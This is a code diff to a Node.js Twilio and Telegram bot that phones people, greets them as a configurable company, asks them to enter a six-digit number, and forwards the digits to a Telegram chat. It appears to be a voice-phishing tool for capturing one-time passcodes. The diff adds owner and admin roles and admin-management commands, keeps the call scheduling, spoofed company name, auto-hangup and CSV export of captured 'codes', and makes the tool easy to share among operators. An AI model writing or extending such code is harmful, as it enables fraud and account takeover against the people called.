@@ -25,7 +25,8 @@ const TWILIO_NUMBER = process.env.TWILIO_NUMBER;
 
 const BASE_URL = process.env.BASE_URL || "";
 
-const ALLOWED_CHAT_IDS = (process.env.ALLOWED_CHAT_IDS || CHAT_ID || "")
+const OWNER_ID = String(process.env.OWNER_ID || "");
+const ADMIN_IDS = (process.env.ADMIN_IDS || "")
   .split(",")
   .map(s => s.trim())
   .filter(Boolean);
@@ -49,7 +50,7 @@ const defaultSettings = {
   company: "Support",
   digits: 6,
   assistant: 0,
-  itemName: "reference number",
+  itemName: "booking number",
   greeting:
     "Hello from {company}. Please enter your {digits} digit {item}.",
   retryMessage: "Please re-enter your {item}.",
@@ -85,7 +86,8 @@ function defaultDB() {
       autoHungUp: 0,
       scheduledCalls: 0,
       completedCalls: 0
-    }
+    },
+    admins: ADMIN_IDS
   };
 }
 
@@ -110,7 +112,8 @@ function loadDB() {
       stats: {
         ...defaultDB().stats,
         ...(parsed.stats || {})
-      }
+      },
+      admins: Array.isArray(parsed.admins) ? parsed.admins : ADMIN_IDS
     };
   } catch (e) {
     console.log("loadDB error:", e.message);
@@ -163,6 +166,30 @@ let scheduledJobs = [];
 // HELPERS
 // ============================================================
 
+function getUserId(update) {
+  return String(
+    update?.message?.from?.id ||
+      update?.callback_query?.from?.id ||
+      ""
+  );
+}
+
+function getRole(update) {
+  const userId = getUserId(update);
+  if (!userId) return "blocked";
+  if (userId === OWNER_ID) return "owner";
+  if ((db.admins || []).includes(userId)) return "admin";
+  return "blocked";
+}
+
+function isAuthorized(update) {
+  return getRole(update) !== "blocked";
+}
+
+function ownerOnly(update) {
+  return getRole(update) === "owner";
+}
+
 function saveSettings() {
   db.settings = settings;
   saveDB();
@@ -198,17 +225,6 @@ function pushCodeEntry(caller, value, sid = "") {
 
 function markPanelDirty() {
   panelDirty = true;
-}
-
-function isAuthorized(update) {
-  if (!ALLOWED_CHAT_IDS.length) return true;
-
-  const chatId =
-    update?.message?.chat?.id ||
-    update?.callback_query?.message?.chat?.id ||
-    update?.callback_query?.from?.id;
-
-  return ALLOWED_CHAT_IDS.includes(String(chatId));
 }
 
 function assistant() {
@@ -327,9 +343,9 @@ async function tg(method, data) {
   return res.json();
 }
 
-async function tgSend(text, buttons = null) {
+async function tgSend(text, buttons = null, chatId = CHAT_ID) {
   const body = {
-    chat_id: CHAT_ID,
+    chat_id: chatId,
     text
   };
   if (buttons) {
@@ -397,7 +413,7 @@ async function tgSendDocument(filename, contentBuffer) {
 // PANEL
 // ============================================================
 
-function panelButtons() {
+function panelButtons(role = "admin") {
   const quickButtons = Object.entries(quickDialTargets)
     .filter(([, value]) => value)
     .slice(0, 3)
@@ -434,10 +450,16 @@ function panelButtons() {
   if (quickButtons.length) rows.splice(3, 0, quickButtons);
   if (profileButtons.length) rows.splice(4, 0, profileButtons);
 
+  if (role === "owner") {
+    rows.push([
+      { text: "👥 Admins", callback_data: "admins" }
+    ]);
+  }
+
   return rows;
 }
 
-function panelText() {
+function panelText(role = "admin") {
   cleanupEndedCalls();
 
   const active = sortedCalls().slice(0, 8);
@@ -476,6 +498,8 @@ function panelText() {
   lines.push(`Assistant: ${assistant().name}`);
   lines.push(`Item: ${settings.itemName}`);
   lines.push(`Paused: ${settings.paused ? "Yes" : "No"}`);
+  lines.push(`Role: ${role}`);
+  lines.push(`Admins: ${(db.admins || []).length}`);
   lines.push(`Max Retries: ${settings.maxRetries}`);
   lines.push(`Input Timeout: ${settings.inputTimeout}s`);
   lines.push(`Auto Confirm: ${settings.autoConfirmSec || 0}s`);
@@ -484,10 +508,10 @@ function panelText() {
   return lines.join("\n");
 }
 
-async function updatePanel(forceNew = false) {
+async function updatePanel(forceNew = false, role = "admin") {
   try {
-    const text = panelText();
-    const buttons = panelButtons();
+    const text = panelText(role);
+    const buttons = panelButtons(role);
 
     if (!panelMessageId || forceNew) {
       const msg = await tgSend(text, buttons);
@@ -503,7 +527,7 @@ async function updatePanel(forceNew = false) {
       panelBrokenCount++;
       if (panelBrokenCount >= 2) {
         panelMessageId = null;
-        await updatePanel(true);
+        await updatePanel(true, role);
       }
     } else {
       panelBrokenCount = 0;
@@ -741,7 +765,8 @@ app.get("/health", (req, res) => {
     time: Date.now(),
     activeCalls: sortedCalls().filter(c => c.status !== "Ended").length,
     paused: settings.paused,
-    lastDialed
+    lastDialed,
+    admins: (db.admins || []).length
   });
 });
 
@@ -863,15 +888,13 @@ app.post("/input", async (req, res) => {
     res.send(buildReviewTwiml(call));
 
     try {
-      // separate entry message
       await tgSend(`${digits}`);
 
-      // auto-create panel if missing, otherwise refresh existing one
       if (!panelMessageId) {
-        await updatePanel(true);
+        await updatePanel(true, "owner");
       } else {
         markPanelDirty();
-        await updatePanel();
+        await updatePanel(false, "owner");
       }
     } catch (e) {
       console.log("telegram send error:", e.message);
@@ -906,14 +929,12 @@ app.post("/hold", (req, res) => {
 app.post("/telegram", async (req, res) => {
   try {
     const update = req.body || {};
+    const role = getRole(update);
 
     if (!isAuthorized(update)) {
       return res.sendStatus(200);
     }
 
-    // -------------------------
-    // Button callbacks
-    // -------------------------
     if (update.callback_query) {
       const action = update.callback_query.data;
       const callbackId = update.callback_query.id;
@@ -997,6 +1018,10 @@ app.post("/telegram", async (req, res) => {
       }
 
       if (action === "pause") {
+        if (role !== "owner") {
+          await tgAnswerCallback(callbackId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = true;
         saveSettings();
         markPanelDirty();
@@ -1005,6 +1030,10 @@ app.post("/telegram", async (req, res) => {
       }
 
       if (action === "resume") {
+        if (role !== "owner") {
+          await tgAnswerCallback(callbackId, "Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = false;
         saveSettings();
         markPanelDirty();
@@ -1023,7 +1052,7 @@ app.post("/telegram", async (req, res) => {
 
       if (action === "status") {
         markPanelDirty();
-        await updatePanel();
+        await updatePanel(false, role);
         await tgAnswerCallback(callbackId, "Panel refreshed");
         return res.sendStatus(200);
       }
@@ -1035,6 +1064,19 @@ app.post("/telegram", async (req, res) => {
         });
         await tgSend(text);
         await tgAnswerCallback(callbackId, "Logs sent");
+        return res.sendStatus(200);
+      }
+
+      if (action === "admins") {
+        if (role !== "owner") {
+          await tgAnswerCallback(callbackId, "Owner only");
+          return res.sendStatus(200);
+        }
+        const out = (db.admins || []).length
+          ? "👥 Admins\n\n" + db.admins.join("\n")
+          : "No admins";
+        await tgSend(out);
+        await tgAnswerCallback(callbackId, "Admins sent");
         return res.sendStatus(200);
       }
 
@@ -1063,7 +1105,7 @@ app.post("/telegram", async (req, res) => {
           saveSettings();
           await tgSend(`📁 Profile loaded: ${name}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Profile not found");
         }
@@ -1073,9 +1115,6 @@ app.post("/telegram", async (req, res) => {
       }
     }
 
-    // -------------------------
-    // Text commands
-    // -------------------------
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
@@ -1088,7 +1127,7 @@ app.post("/telegram", async (req, res) => {
 
       if (text === "/panel" || text === "/menu" || text === "/status") {
         panelMessageId = null;
-        await updatePanel(true);
+        await updatePanel(true, role);
         return res.sendStatus(200);
       }
 
@@ -1123,7 +1162,10 @@ app.post("/telegram", async (req, res) => {
 /stop
 /quickdials
 /schedule +number 10m
-/settings`);
+/settings
+/listadmins
+/addadmin ID
+/removeadmin ID`);
         return res.sendStatus(200);
       }
 
@@ -1138,7 +1180,8 @@ Max Retries: ${settings.maxRetries}
 Input Timeout: ${settings.inputTimeout}
 Auto Confirm: ${settings.autoConfirmSec}
 Auto Hangup: ${settings.autoHangupSec}
-Paused: ${settings.paused ? "Yes" : "No"}`);
+Paused: ${settings.paused ? "Yes" : "No"}
+Role: ${role}`);
         return res.sendStatus(200);
       }
 
@@ -1190,6 +1233,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
       }
 
       if (text === "/clearcodes") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
         db.codes = [];
         saveDB();
         await tgSend("Entries cleared");
@@ -1197,6 +1244,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
       }
 
       if (text === "/export") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
         const csv = toCsv(db.codes);
         await tgSendDocument("entries.csv", Buffer.from(csv, "utf8"));
         return res.sendStatus(200);
@@ -1227,7 +1278,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveDB();
           await tgSend(`✅ Profile saved: ${name}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         }
 
         return res.sendStatus(200);
@@ -1247,7 +1298,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`📁 Profile loaded: ${name}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         }
 
         return res.sendStatus(200);
@@ -1263,7 +1314,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveDB();
           await tgSend(`🗑 Profile deleted: ${name}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         }
 
         return res.sendStatus(200);
@@ -1297,7 +1348,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`✅ ${d} digits set`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Use /digits 2 to 10");
         }
@@ -1311,7 +1362,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🎙 ${assistant().name} assistant set`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Use /assistant 1 to 6");
         }
@@ -1327,7 +1378,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🏢 Company set to ${settings.company}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         }
         return res.sendStatus(200);
       }
@@ -1341,7 +1392,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`📝 Item set to ${settings.itemName}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         }
         return res.sendStatus(200);
       }
@@ -1353,7 +1404,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`🔁 Max retries set to ${n}`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Usage: /maxretries 3");
         }
@@ -1367,7 +1418,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`⏱ Input timeout set to ${n}s`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Usage: /timeout 8");
         }
@@ -1381,7 +1432,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`✅ Auto confirm set to ${n}s`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Usage: /autoconfirm 0");
         }
@@ -1395,7 +1446,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
           saveSettings();
           await tgSend(`⛔ Auto hangup set to ${n}s`);
           markPanelDirty();
-          await updatePanel();
+          await updatePanel(false, role);
         } else {
           await tgSend("Usage: /autohangup 0");
         }
@@ -1403,24 +1454,36 @@ Scheduled: ${db.stats.scheduledCalls}`);
       }
 
       if (text === "/pause") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = true;
         saveSettings();
         await tgSend("⏸ Calling paused");
         markPanelDirty();
-        await updatePanel();
+        await updatePanel(false, role);
         return res.sendStatus(200);
       }
 
       if (text === "/resume") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
         settings.paused = false;
         saveSettings();
         await tgSend("▶ Calling resumed");
         markPanelDirty();
-        await updatePanel();
+        await updatePanel(false, role);
         return res.sendStatus(200);
       }
 
       if (text === "/stop") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
         const active = sortedCalls().filter(c => c.status !== "Ended");
         for (const c of active) {
           try {
@@ -1435,7 +1498,7 @@ Scheduled: ${db.stats.scheduledCalls}`);
         saveSettings();
         await tgSend("🛑 All calls stopped and calling paused");
         markPanelDirty();
-        await updatePanel();
+        await updatePanel(false, role);
         return res.sendStatus(200);
       }
 
@@ -1467,6 +1530,52 @@ Scheduled: ${db.stats.scheduledCalls}`);
 
         return res.sendStatus(200);
       }
+
+      if (text === "/listadmins") {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
+        const out = (db.admins || []).length
+          ? "👥 Admins\n\n" + db.admins.join("\n")
+          : "No admins";
+        await tgSend(out);
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/addadmin")) {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
+        const id = text.split(" ")[1];
+        if (!id) {
+          await tgSend("Usage: /addadmin 123456789");
+          return res.sendStatus(200);
+        }
+        if (!db.admins.includes(String(id))) {
+          db.admins.push(String(id));
+          saveDB();
+        }
+        await tgSend(`✅ Admin added: ${id}`);
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/removeadmin")) {
+        if (!ownerOnly(update)) {
+          await tgSend("Owner only");
+          return res.sendStatus(200);
+        }
+        const id = text.split(" ")[1];
+        if (!id) {
+          await tgSend("Usage: /removeadmin 123456789");
+          return res.sendStatus(200);
+        }
+        db.admins = db.admins.filter(x => String(x) !== String(id));
+        saveDB();
+        await tgSend(`🗑 Admin removed: ${id}`);
+        return res.sendStatus(200);
+      }
     }
   } catch (e) {
     console.log("/telegram error:", e.message);
@@ -1482,10 +1591,10 @@ Scheduled: ${db.stats.scheduledCalls}`);
 setInterval(() => {
   if (panelDirty && panelMessageId) {
     panelDirty = false;
-    updatePanel();
+    updatePanel(false, "owner");
   }
   cleanupEndedCalls();
-}, 500);
+}, 300);
 
 // ============================================================
 // STARTUP
@@ -1497,7 +1606,7 @@ app.listen(PORT, async () => {
 
   try {
     await new Promise(r => setTimeout(r, 3000));
-    await updatePanel(true);
+    await updatePanel(true, "owner");
     console.log("Telegram panel created");
   } catch (e) {
     console.log("Panel creation error:", e.message);
